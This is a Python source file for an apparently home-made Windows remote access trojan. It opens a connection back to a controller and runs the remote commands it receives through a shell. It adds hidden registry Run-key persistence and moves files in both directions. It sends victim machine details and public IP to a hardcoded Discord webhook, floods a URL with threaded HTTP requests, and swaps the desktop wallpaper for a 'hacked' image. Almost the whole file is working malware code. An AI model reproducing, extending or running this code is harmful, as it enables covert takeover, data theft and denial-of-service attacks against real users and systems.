import socket
import json
import subprocess
import os
import shutil
import sys
import urllib
import ctypes
import requests
from socket import gethostname
import random
from colored import fg, attr
import platform
#import pyautogui
import time
import threading
from requests.exceptions import HTTPError
from requests.exceptions import ConnectionError
from time import gmtime, strftime
from datetime import datetime
import fake_useragent

def persistence(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            subprocess.call('copy ' + os.path.split(sys.argv[0])[1] + ' %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
            subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v BindShell /d %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
            subprocess.call('attrib +s +r +h %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')
    
    
    #subprocess.call('copy ' + os.path.split(sys.argv[0])[1] + ' %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
    #subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v BindShell /d %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
    #subprocess.call('attrib +s +r +h %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)

def connection():
    while True:
        try:
            s.connect(('0.0.0.0', 5550))
            sys.setrecursionlimit(1000)
            threading.Thread(target=shell())
            s.close()
            break
        except OSError:
            pass
        except RecursionError:
            pass
        except:
            connection()
        
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

#get funcation 
def internet_file(url):
    print(url)
    get_internet = requests.get(url)
    file = url.split("/")[-1]
    with open(file, 'wb') as outfile:
        outfile.write(get_internet.content)
    
def screenshot():
    pass
    #myScreenshot = pyautogui.screenshot('screen.png')
    #myScreenshot.save("screen.png")
    
def sending_keys():
        #sending to the sever
    print("{} [*] sending keys ......{}".format(fg(20), attr(0)))
        #requesting the ip of the victim system throught the google agent
    ip = requests.get("https://api.ipify.org", headers= {"user-agent": "google.com"})
        #sever api send the keys..
    server_api = "https://discord.com/api/webhooks/1063455978290434099/iVA16jBdzxg9s8uA0de_KHh4vRho7z5F2EqoJQoyWBp0PnjPTD1O49yGXfcJYFcCyn3O"
        #encoding the entire keys for send url standard interface
    #j_mac = getmac.get_mac_address().encode().decode()
        #j_mac = urllib.parse.quote(base64.b64encode(mac))
    os = platform.system().encode().decode()
    computer_name = platform.node().encode().decode()
    release_version = platform.release().encode().decode()
    processor = platform.processor().encode().decode()
    print("after the encoding the keys are...")
    #print(j_mac)

        #json format
    webhook_data = {"username": "Malware", "embeds": [
            dict(title="let's hack the system..",
                 color=f'{random.randint(0, 0xFFFFFF)}',
                 fields=[
                     {
                         "name": "**victim info**",
                         "value": f"c:name: `{computer_name}` \n version : '{release_version}'",
                         "inline": True

                     },
                     {
                         "name": "**internal info**",
                         "value": f"processor : '{processor}'",
                         "inline": True

                     },
                     {
                         "name": "**PC info**",
                         "value": f"PC name: `{gethostname()}` \n ip : '{ip.text}'",
                         "inline": True

                     },
                 ]),
        ]}

        #sending the post request for having the data ..
    requests.post(server_api, data=json.dumps(webhook_data), headers={"content-Type" : "application/json"})   

def ddos():
    l = []
    url = ''
    #ua = UserAgent
    #options = webdriver.ChromeOptions()
    #options.add_argument(f"user-agent={random.choice(len(UserAgent))}")
    ua = fake_useragent.UserAgent().random
    headers = {'user-agent': ua}

    def current_mil_time():
        t = time.time()
        t_ms = int(t * 1000)
        # print(f"The current time in milliseconds: {t_ms}")
        return t_ms

    def current_sec_time():
        t = time.time()
        t_s = round(int(t))
        # print(f"The current time in seconds: {t_s}")
        return t_s

    def dateandtime():
        now_GMT = strftime("%a, %d %b %Y %I:%M:%S %p %Z", gmtime())
        print("GMT time is now: " + now_GMT)

    def time_le():
        current = datetime.utcnow().second
        #print("current second : {}".format(current))
        return current

    def count_resp_per_sec(times):
        a = current_sec_time()
        l.append([times, a])

        for ula in l:
            #print("ithukaa irrukan : {}".format(ula))
            if ula[1] - ula[0] >= 60:
                l.remove(ula)
            else:
                print("none clean")
            return l

    #def soup():
    #    q = requests.get(url)
    #    soup = BeautifulSoup(q)
    #    for link in soup.findAll('a'):
    #        print(link.get('href'))

    #def sec():
    #    sec = current_mil_time()
    #    in_sec = current_mil_time() - sec
    #    fin_sec = round(int(in_sec / 1000))
    #    return fin_sec

    def make_request(name):
        #ua = UserAgent()
        while True:
            try:
                s = current_mil_time()
                #headers = {'User-Agent': ua.random}
                r = requests.get(url, headers = headers).text
                print("done....")
                t = current_mil_time() - s
                z = round(int(t / 1000))
                fin_sec = time_le()
                #print("secccc {}::".format(z))
                print("Response from the server -- no.of thread #{}: timetaken from responce {} in sec:{}".format(name, t, fin_sec))
                count_resp_per_sec(t)
            except TypeError:
                pass
            except HTTPError:
                pass
            except ConnectionError:
                pass
            except KeyboardInterrupt:
                sys.exit(-1)


    threads = 10

    i = 0
    dateandtime()
    while i <= threads:
        x = threading.Thread(target=make_request, args=(i,))
        print("Starting thread #{}...".format(i))
        x.start()
        i += 1



def change_back():
    print("to changing wallpapers....")
    root = os.path.expanduser("~")
    #urllink = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
    urllink = "https://thehackernews.com/images/-tgm9D2gCAQc/YSTRfpc9g3I/AAAAAAAADnk/kyacqu6ahyQEuuD8qH-mRh4v5fnzmoM-QCLcBGAsYHQ/s0/russian-ransomware-hackers.jpg"
    #path = f'{root}Desktop/hacked.jpg'
    path = ("{}/Desktop/hacked.jpg".format(root))
    urllib.request.urlretrieve(urllink, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
    #return os.remove("{}/Desktop/hacked.jpg".format(root))
    time.sleep(5)
    path123 = ("{}/Desktop/hacked.jpg".format(root))
    os.remove(path123)
    

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            change_back()
        elif command[:8] == 'curl':
            try:
                internet_file(command[9:]) 
            except:
                reliable_send("[*} file doesn't loaded......") 
                continue       
        elif command == 'info':
            sending_keys()     
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command == 'dai':
            pass
        elif command[:5] == 'run':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[*} run the command")
            except:
                reliable_send("[*] wrong command")  
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

